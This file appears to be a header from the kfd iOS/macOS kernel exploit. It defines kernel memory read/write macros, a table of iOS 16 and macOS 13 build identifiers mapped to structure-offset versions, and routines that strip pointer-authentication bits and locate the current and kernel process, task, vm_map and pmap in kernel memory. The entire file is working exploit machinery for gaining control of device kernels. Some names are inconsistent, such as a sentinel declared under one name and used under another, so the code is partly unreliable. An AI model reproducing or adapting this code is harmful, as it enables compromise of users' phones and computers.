/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef info_h
#define info_h

#include "info/dynamic_info.h"
#include "info/static_info.h"

/*
 * Note that these macros assume that the kfd pointer is in scope.
 */
#define kfd_offset(field_name) (kern_versions[kfd->info.env.vid].field_name)

#define kget_u64(field_name, object_kaddr)                                        \
    ({                                                                            \
        u64 tmp_buffer = 0;                                                       \
        u64 field_kaddr = (u64)(object_kaddr) + kfd_offset(field_name);           \
        kread((u64)(kfd), (field_kaddr), (&tmp_buffer), (sizeof(tmp_buffer)));    \
        tmp_buffer;                                                               \
    })

#define kset_u64(field_name, new_value, object_kaddr)                              \
    do {                                                                           \
        u64 tmp_buffer = new_value;                                                \
        u64 field_kaddr = (u64)(object_kaddr) + kfd_offset(field_name);            \
        kwrite((u64)(kfd), (&tmp_buffer), (field_kaddr), (sizeof(tmp_buffer)));    \
    } while (0)

#define uget_u64(field_name, object_uaddr)                                 \
    ({                                                                     \
        u64 field_uaddr = (u64)(object_uaddr) + kfd_offset(field_name);    \
        u64 old_value = *(volatile u64*)(field_uaddr);                     \
        old_value;                                                         \
    })

#define uset_u64(field_name, new_value, object_uaddr)                      \
    do {                                                                   \
        u64 field_uaddr = (u64)(object_uaddr) + kfd_offset(field_name);    \
        *(volatile u64*)(field_uaddr) = (u64)(new_value);                  \
    } while (0)

#include "info/dynamic_types/kqworkloop.h"
#include "info/dynamic_types/proc.h"
#include "info/dynamic_types/task.h"
#include "info/dynamic_types/thread.h"
#include "info/dynamic_types/uthread.h"
#include "info/dynamic_types/vm_map.h"
#include "info/dynamic_types/IOSurface.h"
#include "info/dynamic_types/IOSurface.h"

/*
 * Helper macros for static types.
 */

#define static_sizeof(object) (sizeof(struct object))

#define static_offsetof(object, field) (offsetof(struct object, field))

#define static_uget(object, field, object_uaddr) (((volatile struct object*)(object_uaddr))->field)

#define static_uset(object, field, object_uaddr, field_value)                  \
    do {                                                                       \
        (((volatile struct object*)(object_uaddr))->field = (field_value));    \
    } while (0)

#define static_kget(object, field_type, field, object_kaddr)                       \
    ({                                                                             \
        u64 buffer = 0;                                                            \
        u64 field_kaddr = (u64)(object_kaddr) + static_offsetof(object, field);    \
        kread((u64)(kfd), (field_kaddr), (&buffer), (sizeof(buffer)));             \
        field_type field_value = *(field_type*)(&buffer);                          \
        field_value;                                                               \
    })

#define static_kset_u64(object, field, object_kaddr, field_value)                  \
    do {                                                                           \
        u64 buffer = field_value;                                                  \
        u64 field_kaddr = (u64)(object_kaddr) + static_offsetof(object, field);    \
        kwrite((u64)(kfd), (&buffer), (field_kaddr), (sizeof(buffer)));            \
    } while (0)

#include "info/static_types/fileglob.h"
#include "info/static_types/fileops.h"
#include "info/static_types/fileproc_guard.h"
#include "info/static_types/fileproc.h"
#include "info/static_types/ipc_entry.h"
#include "info/static_types/ipc_port.h"
#include "info/static_types/ipc_space.h"
#include "info/static_types/miscellaneous_types.h"
#include "info/static_types/pmap.h"
#include "info/static_types/pseminfo.h"
#include "info/static_types/psemnode.h"
#include "info/static_types/semaphore.h"
#include "info/static_types/vm_map_copy.h"
#include "info/static_types/vm_map_entry.h"
#include "info/static_types/vm_named_entry.h"
#include "info/static_types/vm_object.h"
#include "info/static_types/vm_page.h"

const u64 ios_16_0_a   = 0x0000373533413032; // 20A357
const u64 ios_16_0_b   = 0x0000323633413032; // 20A362
const u64 ios_16_0_1   = 0x0000313733413032; // 20A371
const u64 ios_16_0_2   = 0x0000303833413032; // 20A380
const u64 ios_16_0_3   = 0x0000323933413032; // 20A392
const u64 ios_16_1     = 0x0000003238423032; // 20B82
const u64 ios_16_1_1   = 0x0000313031423032; // 20B101
const u64 ios_16_1_2   = 0x0000303131423032; // 20B110
const u64 ios_16_2     = 0x0000003536433032; // 20C65
const u64 ios_16_3     = 0x0000003734443032; // 20D47
const u64 ios_16_3_1   = 0x0000003736443032; // 20D67
const u64 ios_16_4     = 0x0000373432453032; // 20E247
const u64 ios_16_4_1   = 0x0000323532453032; // 20E252
const u64 ios_16_5     = 0x0000003636463032; // 20F66
const u64 ios_16_5_1   = 0x0000003537463032; // 20F75

const u64 macos_13_0   = 0x0000303833413232; // 22A380
const u64 macos_13_0_1 = 0x0000303034413232; // 22A400
const u64 macos_13_1   = 0x0000003536433232; // 22C65
const u64 macos_13_2   = 0x0000003934443232; // 22D49
const u64 macos_13_2_1 = 0x0000003836443232; // 22D68
const u64 macos_13_3   = 0x0000323532453232; // 22E252
const u64 macos_13_3_1 = 0x0000313632453232; // 22E261
const u64 macos_13_4   = 0x0000003636463232; // 22F66

//#define t1sz_boot (17ull)
#define t1sz_boot (25ull)
#define ptr_mask ((1ull << (64ull - t1sz_boot)) - 1ull)
#define pac_mask (~ptr_mask)
#define unsign_kaddr(kaddr) ((kaddr) | (pac_mask))

const char copy_sentinel[16] = "p0up0u was here";
const u64 copy_sentinel_size = sizeof(copy_sentinel);

void info_init(struct kfd* kfd)
{
    /*
     * Initialize the kfd->info.copy substructure.
     *
     * Note that the vm_copy() call in krkw_helper_grab_free_pages() makes the following assumptions:
     * - The size of the copy must be strictly greater than msg_ool_size_small.
     * - The source object must have a copy strategy of MEMORY_OBJECT_COPY_NONE.
     * - The destination object must have a copy strategy of MEMORY_OBJECT_COPY_SYMMETRIC.
     */
    kfd->info.copy.size = pages(4);
    assert(kfd->info.copy.size > msg_ool_size_small);
    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.src_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.dst_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE));
    for (u64 offset = pages(0); offset < kfd->info.copy.size; offset += pages(1)) {
        bcopy(info_copy_sentinel, (void*)(kfd->info.copy.src_uaddr + offset), info_copy_sentinel_size);
        bcopy(info_copy_sentinel, (void*)(kfd->info.copy.dst_uaddr + offset), info_copy_sentinel_size);
    }

    /*
     * Initialize the kfd->info.env substructure.
     */
    kfd->info.env.pid = getpid();
    print_i32(kfd->info.env.pid);

    thread_identifier_info_data_t data = {};
    thread_info_t info = (thread_info_t)(&data);
    mach_msg_type_number_t count = THREAD_IDENTIFIER_INFO_COUNT;
    assert_mach(thread_info(mach_thread_self(), THREAD_IDENTIFIER_INFO, info, &count));
    kfd->info.env.tid = data.thread_id;
    print_u64(kfd->info.env.tid);

    usize size1 = sizeof(kfd->info.env.maxfilesperproc);
    assert_bsd(sysctlbyname("kern.maxfilesperproc", &kfd->info.env.maxfilesperproc, &size1, NULL, 0));
    print_u64(kfd->info.env.maxfilesperproc);

    struct rlimit rlim = { .rlim_cur = kfd->info.env.maxfilesperproc, .rlim_max = kfd->info.env.maxfilesperproc };
    assert_bsd(setrlimit(RLIMIT_NOFILE, &rlim));

    usize size2 = sizeof(kfd->info.env.osversion);
    assert_bsd(sysctlbyname("kern.osversion", &kfd->info.env.osversion, &size2, NULL, 0));
    
    if (@available(iOS 16, *)) {
        switch (*(u64*)(&kfd->info.env.osversion)) {
            case ios_16_3:
            case ios_16_3_1: {
                kfd->info.env.vid = 0;
                kfd->info.env.ios = true;
                break;
            }
            case ios_16_4:
            case ios_16_4_1:
            case ios_16_5:
            case ios_16_5_1: {
                kfd->info.env.vid = 1;
                kfd->info.env.ios = true;
                break;
            }
            case macos_13_1: {
                kfd->info.env.vid = 2;
                kfd->info.env.ios = false;
                break;
            }
            case macos_13_4: {
                kfd->info.env.vid = 3;
                kfd->info.env.ios = false;
                break;
            }
            default: {
                assert_false("unsupported osversion");
            }
        }
    }
    else {
        int ptrAuthVal = 0;
        size_t len = sizeof(ptrAuthVal);
        assert(sysctlbyname("hw.optional.arm.FEAT_PAuth", &ptrAuthVal, &len, NULL, 0) != -1);
        
        kfd->info.env.ios = true;
        if (@available(iOS 15.4, *)) {
            kfd->info.env.vid = 8;
        }
        else if (@available(iOS 15.2, *)) {
            kfd->info.env.vid = 6;
        }
        else if (@available(iOS 15.0, *)) {
            kfd->info.env.vid = 4;
        }
        
        if (ptrAuthVal != 0) {
            kfd->info.env.vid++;
        }
    }

    

    print_i32(kfd->info.env.pid);
    print_u64(kfd->info.env.tid);
    print_u64(kfd->info.env.vid);
    print_bool(kfd->info.env.ios);
    print_string(kfd->info.env.osversion);
    print_u64(kfd->info.env.maxfilesperproc);
}

void info_run(struct kfd* kfd)
{
    timer_start();

    /*
     * current_proc() and current_task()
     */
    assert(kfd->info.kaddr.current_proc);
    u64 signed_task_kaddr = dynamic_kget(proc, task, kfd->info.kaddr.current_proc);
    kfd->info.kaddr.current_task = unsign_kaddr(signed_task_kaddr);
    print_x64(kfd->info.kaddr.current_proc);
    print_x64(kfd->info.kaddr.current_task);

    /*
     * current_map()
     */
    u64 signed_map_kaddr = kget_u64(task__map, kfd->info.kaddr.current_task);
    kfd->info.kaddr.current_map = unsign_kaddr(signed_map_kaddr);
    print_x64(kfd->info.kaddr.current_map);

    /*
     * current_pmap()
     */
    u64 signed_pmap_kaddr = kget_u64(_vm_map__pmap, kfd->info.kaddr.current_map);
    kfd->info.kaddr.current_pmap = unsign_kaddr(signed_pmap_kaddr);
    print_x64(kfd->info.kaddr.current_pmap);

    /*
     * current_thread() and current_uthread()
     */
    const bool find_current_thread = false;
    if (find_current_thread) {
        u64 thread_kaddr = kget_u64(task__threads__next, kfd->info.kaddr.current_task);

        while (true) {
            u64 tid = kget_u64(thread__thread_id, thread_kaddr);
            if (tid == kfd->info.env.tid) {
                kfd->info.kaddr.current_thread = thread_kaddr;
                kfd->info.kaddr.current_uthread = thread_kaddr + kfd_offset(thread__object_size);
                break;
            }

            thread_kaddr = kget_u64(thread__task_threads__next, thread_kaddr);
        }

        print_x64(kfd->info.kaddr.current_thread);
        print_x64(kfd->info.kaddr.current_uthread);
    }

    if (kfd->info.kaddr.kernel_proc) {
        /*
         * kernel_proc() and kernel_task()
         */
        u64 signed_kernel_task = dynamic_kget(proc, task, kfd->info.kaddr.kernel_proc);
        kfd->info.kaddr.kernel_task = unsign_kaddr(signed_kernel_task);
        print_x64(kfd->info.kaddr.kernel_proc);
        print_x64(kfd->info.kaddr.kernel_task);

        /*
         * kernel_map()
         */
        u64 signed_map_kaddr = kget_u64(task__map, kfd->info.kaddr.kernel_task);
        kfd->info.kaddr.kernel_map = unsign_kaddr(signed_map_kaddr);
        print_x64(kfd->info.kaddr.kernel_map);

        /*
         * kernel_pmap()
         */
        u64 signed_pmap_kaddr = kget_u64(_vm_map__pmap, kfd->info.kaddr.kernel_map);
        kfd->info.kaddr.kernel_pmap = unsign_kaddr(signed_pmap_kaddr);
        print_x64(kfd->info.kaddr.kernel_pmap);
    }

    timer_end();
}

void info_free(struct kfd* kfd)
{
    assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size));
    assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.dst_uaddr, kfd->info.copy.size));
}

#endif /* info_h */
